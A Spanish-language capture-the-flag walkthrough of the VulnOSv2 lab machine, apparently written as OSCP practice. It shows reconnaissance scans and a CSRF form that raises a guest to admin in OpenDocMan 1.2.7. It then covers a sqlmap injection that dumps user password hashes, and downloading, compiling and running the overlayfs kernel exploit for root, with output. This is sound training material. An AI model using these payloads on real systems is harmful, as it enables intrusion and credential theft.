---
layout: post
title: VulnOSv2 - Walkthrough
date: 2020-02-29 20:44
description: Walkthrough - VulnOSv2
toc: true
comments: true
tags: 
 - OSCP
 - Walkthrough
 - Vulnhub

---

## **Walkthrough de VulnOSv2**
---

## **Links**
[VulnOSv2 en Vulnhub](https://www.vulnhub.com/entry/vulnos-2,147/)



## **Reconocimiento**
---
>**`nmap -T4 -p- 10.0.0.123`**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-29 20:52 -03
Nmap scan report for 10.0.0.123
Host is up (0.000062s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6667/tcp open  irc
MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.36 seconds
```

>**`nmap -A -T4 -p 22,80,666 10.0.0.123 -oA vulnos`**

```console
# Nmap 7.80 scan initiated Sat Feb 29 19:51:44 2020 as: nmap -A -T4 -p 22,80,666 -oA vulnos 10.0.0.123
Nmap scan report for 10.0.0.123
Host is up (0.00014s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)
80/tcp  open   http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: VulnOSv2
666/tcp closed doom
MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.14 ms 10.0.0.123

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 29 19:51:53 2020 -- 1 IP address (1 host up) scanned in 8.83 seconds
```

---
### **Protocolo HTTP (80)**
---

Se puede obserbar que existen dos sitios distintos en esta VM, uno llamado **/jabc** al que nos redirecciona la el servidor web cuando se ingresa a ``http://10.0.0.123`` y el otro, llamado **/jabcd0cs** al cual se llega mediante un texto oculto dentro de la página **jabc**.

---

![img]({{ '/assets/images/Vulnos/jabc_00.png' | relative_url }}){: .center-image }*(Nada por aquí)*

---

![img]({{ '/assets/images/Vulnos/jabc_01.png' | relative_url }}){: .center-image }*(En realidad si)*

---

Ya tenemos ruta del nuevo sitio y un conjunto de usuario y contraseña: ``guest/guest``


Antes de investigar más voy a correr las herramientas ``Nikto`` y ``Dirb`` en ambos sitios.


---
>**``nikto -h http://10.0.0.123/jabc``**

```console
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.123
+ Target Hostname:    10.0.0.123
+ Target Port:        80
+ Start Time:         2020-02-29 19:55:25 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.14
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-generator' found, with contents: Drupal 7 (http://drupal.org)
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-3268: /jabc/scripts/: Directory indexing found.
+ OSVDB-3268: /jabc/includes/: Directory indexing found.
+ Entry '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /jabc/misc/: Directory indexing found.
+ Entry '/misc/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /jabc/modules/: Directory indexing found.
+ Entry '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /jabc/profiles/: Directory indexing found.
+ Entry '/profiles/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/scripts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /jabc/themes/: Directory indexing found.
+ Entry '/themes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/install.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/xmlrpc.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/register/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 36 entries which should be manually viewed.
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3092: /jabc/includes/: This might be interesting...
+ OSVDB-3092: /jabc/misc/: This might be interesting...
+ OSVDB-3092: /jabc/install.php: Drupal install.php file found.
+ OSVDB-3092: /jabc/install.php: install.php file found.
+ OSVDB-3092: /jabc/xmlrpc.php: xmlrpc.php was found.
+ OSVDB-3268: /jabc/sites/: Directory indexing found.
+ 8736 requests: 0 error(s) and 34 item(s) reported on remote host
+ End Time:           2020-02-29 19:56:33 (GMT-3) (68 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

>**``nikto -h http://10.0.0.123/jabcd0cs``**

```console
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.123
+ Target Hostname:    10.0.0.123
+ Target Port:        80
+ Start Time:         2020-02-29 19:57:13 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.14
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /jabcd0cs/config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /jabcd0cs/includes/: Directory indexing found.
+ OSVDB-3092: /jabcd0cs/includes/: This might be interesting...
+ OSVDB-3268: /jabcd0cs/reports/: Directory indexing found.
+ OSVDB-3092: /jabcd0cs/reports/: This might be interesting...
+ OSVDB-3268: /jabcd0cs/images/: Directory indexing found.
+ OSVDB-3268: /jabcd0cs/docs/: Directory indexing found.
+ OSVDB-3092: /jabcd0cs/README: README file found.
+ OSVDB-3092: /jabcd0cs/LICENSE.txt: License file found may identify site software.
+ /jabcd0cs/.gitignore: .gitignore file found. It is possible to grasp the directory structure.
+ 7893 requests: 0 error(s) and 20 item(s) reported on remote host
+ End Time:           2020-02-29 19:58:23 (GMT-3) (70 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
---
>**``dirb http://10.0.0.123/jabc``**

```console

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Feb 29 19:55:19 2020
URL_BASE: http://10.0.0.123/jabc/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.0.123/jabc/ ----
==> DIRECTORY: http://10.0.0.123/jabc/includes/                                                                      
+ http://10.0.0.123/jabc/index.php (CODE:200|SIZE:9417)                                                              
==> DIRECTORY: http://10.0.0.123/jabc/misc/                                                                          
==> DIRECTORY: http://10.0.0.123/jabc/modules/                                                                       
==> DIRECTORY: http://10.0.0.123/jabc/profiles/                                                                      
+ http://10.0.0.123/jabc/robots.txt (CODE:200|SIZE:1561)                                                             
==> DIRECTORY: http://10.0.0.123/jabc/scripts/                                                                       
==> DIRECTORY: http://10.0.0.123/jabc/sites/                                                                         
==> DIRECTORY: http://10.0.0.123/jabc/templates/                                                                     
==> DIRECTORY: http://10.0.0.123/jabc/themes/                                                                        
+ http://10.0.0.123/jabc/xmlrpc.php (CODE:200|SIZE:42)                                                               
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabc/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabc/misc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabc/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabc/profiles/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabc/scripts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabc/sites/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabc/templates/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabc/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Feb 29 19:55:23 2020
DOWNLOADED: 4612 - FOUND: 3
```

---

>**``dirb http://10.0.0.123/jabcd0cs``**

---

```console

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Feb 29 19:56:18 2020
URL_BASE: http://10.0.0.123/jabd0cs/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.0.123/jabd0cs/ ----
                                                                                                                     
-----------------
END_TIME: Sat Feb 29 19:56:19 2020
DOWNLOADED: 4612 - FOUND: 0
root@duende:~# dirb http://10.0.0.123/jabcd0cs

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Feb 29 19:57:18 2020
URL_BASE: http://10.0.0.123/jabcd0cs/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.0.123/jabcd0cs/ ----
+ http://10.0.0.123/jabcd0cs/admin.php (CODE:302|SIZE:0)                                                             
==> DIRECTORY: http://10.0.0.123/jabcd0cs/docs/                                                                      
==> DIRECTORY: http://10.0.0.123/jabcd0cs/images/                                                                    
==> DIRECTORY: http://10.0.0.123/jabcd0cs/includes/                                                                  
+ http://10.0.0.123/jabcd0cs/index.php (CODE:200|SIZE:5579)                                                          
+ http://10.0.0.123/jabcd0cs/magic (CODE:200|SIZE:13075)                                                             
+ http://10.0.0.123/jabcd0cs/README (CODE:200|SIZE:2202)                                                             
==> DIRECTORY: http://10.0.0.123/jabcd0cs/reports/                                                                   
==> DIRECTORY: http://10.0.0.123/jabcd0cs/templates/                                                                 
==> DIRECTORY: http://10.0.0.123/jabcd0cs/templates_c/                                                               
==> DIRECTORY: http://10.0.0.123/jabcd0cs/uploads/                                                                   
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabcd0cs/docs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabcd0cs/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabcd0cs/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabcd0cs/reports/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabcd0cs/templates/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabcd0cs/templates_c/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.0.0.123/jabcd0cs/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Feb 29 19:57:20 2020
DOWNLOADED: 4612 - FOUND: 4
```
---

Encuentran varias cosas pero la mayoría estan puestas ahí para hacernos perder el tiempo. Así que como me recibe un portal de una aplicación web llamada ``OpenDocman`` con número de versión y todo decido buscar dentro de **searchsploit**:

---

![img]({{ '/assets/images/Vulnos/opendocman_00.png' | relative_url }}){: .center-image }*(Portal de login)*

---

>**``searchsploit docman 1.2.7``**

---

```console
----------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                               |  Path
                                                                             | (/usr/share/exploitdb/)
----------------------------------------------------------------------------- ----------------------------------------
OpenDocMan 1.2.7 - Multiple Vulnerabilities                                  | exploits/php/webapps/32075.txt
----------------------------------------------------------------------------- ----------------------------------------
```
---

Buenisimo, existen dos vulnerabilidades que nos pueden servir. El primer método que use fue el que consiste en subir un ``html`` con el siguiente contenido:

```html
<form action="http://10.0.0.123/jabcd0cs/signup.php" method="post" name="main">
<input type="hidden" name="updateuser" value="1">
<input type="hidden" name="admin" value="1">
<input type="hidden" name="id" value="2">
<input type="submit" name="login" value="Run">
</form>
```

Este código una vez ejecutado le otorga privilegios de admin al usuario logueado que en este caso es llama **Guest**:

---

![img]({{ '/assets/images/Vulnos/opendocman_01.png' | relative_url }}){: .center-image }*(Usuario logueado)*

---

![img]({{ '/assets/images/Vulnos/opendocman_04.png' | relative_url }}){: .center-image }*(Upload de archivo)*

---

Una vez que se sube el archivo el portal da la opción de visualizarlo, al hacerlo hay un botón llamado **RUN** y al correrlo se presenta un error pero si se accede a la configuración del usuario **Guest** se puede ver que ya es administrador del sitio.

El siguiente paso fue editar el password del usuario llamado **WebMin** para poder subir archivos a la aplicación sin restricciones:


![img]({{ '/assets/images/Vulnos/opendocman_05.png' | relative_url }}){: .center-image }*(Password 12345)*

Después de eso se puede acceder con el usuario **WebMin**. La idea era subir el tan conocido shell reverso en php al sitio y se puede hacer pero al no lograr ejecutarlo del lado del servidor está vía de ataque quedó muerta.

A ver la otra vulnerabilidad...

---

La otra vulnerabbilidad consiste en la capacidad de ejecutar un **SQLi** a la página, de esta forma se logra conseguir el password verdadero del usuario **Webmin** que es el mismo que a fin de cuentas nos permite loguearnos a través del protocolo **SSH**.

Para realizar el ataque de SLQi se utilza la herramienta **SQLMap**, cabe aclarar que **durante el exámen para ser **OSCP** no está permitido usar esta herramienta...**

---

>**``sqlmap -u "http://10.0.0.123/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs -T odm_user --dump``**

---

```console
Database: jabcd0cs
Table: odm_user
[2 entries]
+----+--------------------+-------------+----------+----------------------------------+-----------+------------+------------+---------------+
| id | Email              | phone       | username | password                         | last_name | first_name | department | pw_reset_code |
+----+--------------------+-------------+----------+----------------------------------+-----------+------------+------------+---------------+
| 1  | webmin@example.com | 5555551212  | webmin   | b78aae356709f8c31118ea613980954b | min       | web        | 2          | <blank>       |
| 2  | guest@example.com  | 555 5555555 | guest    | 084e0343a0486ff05530df6c705c8bb4 | guest     | guest      | 2          | NULL          |
+----+--------------------+-------------+----------+----------------------------------+-----------+------------+------------+---------------+
```
Una búsqueda rápida del hash en md5 del password del usuario admin arroja que el verdadero password era **webmin1980**

---

### **Protocolo SSH**

---

>**``ssh webmin@10.0.0.123``**

---

Una vez adentro el usuario no levanta ningún interprete de comandos, se soluciona fácil ejecutando el siguiente comando ``/bin/bash``.

Después de buscar un rato apareció un exploit de kernel:

```console
----------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                               |  Path
                                                                             | (/usr/share/exploitdb/)
----------------------------------------------------------------------------- ----------------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Lo | exploits/linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Lo | exploits/linux/local/37293.txt
----------------------------------------------------------------------------- ----------------------------------------
```
Manos a la obra.

Levanté un servidor web en python para descargarlo desde la VM atacada:

>**``python -m SimpleHTTPServer 80``**

Desde la VM atacada:

>**``http://10.0.0.99/37292.c``**

```console
webmin@VulnOSv2:~$ mv 37292.c ofs.c
webmin@VulnOSv2:~$ gcc ofs.c -o ofs
webmin@VulnOSv2:~$ ./ofs 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(webmin)
```
---

### **Flag**
---
```console
root@VulnOSv2:/root# cat flag.txt 
Hello and welcome.
You successfully compromised the company "JABC" and the server completely !!
Congratulations !!!
Hope you enjoyed it.

What do you think of A.I.?
```

---


### **Conclusión**

---

Esta VM no fue muy dificil pero use dos cosas que no están muy recomendadas:

 - SQLMap
 - Exploit de Kernel

 SQLMap no está permitido para el exámen y un exploit de **Kernel** muchas veces puede colgar la VM atacada.

---